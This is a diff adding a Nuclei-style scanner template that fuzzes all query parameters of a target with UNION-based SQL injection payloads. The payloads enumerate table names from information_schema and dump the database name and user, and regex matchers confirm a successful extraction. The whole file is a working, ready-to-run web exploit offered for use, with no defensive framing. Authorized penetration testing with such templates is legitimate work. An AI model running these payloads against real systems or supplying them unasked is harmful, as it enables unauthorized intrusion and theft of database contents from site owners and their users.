@@ -1,0 +1,34 @@
+id: nawab-confirmed-sqli
+
+info:
+  name: 💀 Nawab-Confirmed-SQLi 💀
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      sqli_payloads:
+        - "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
+        - "-1' UNION SELECT 1,database(),user(),4--"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli_payloads}}"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)(information_schema|table_name|column_name)"
+          - "[a-zA-Z0-9_]+@[a-zA-Z0-9.-]+" # Matches user@host format
+        part: body
+
+      - type: status
+        status:
+          - 200
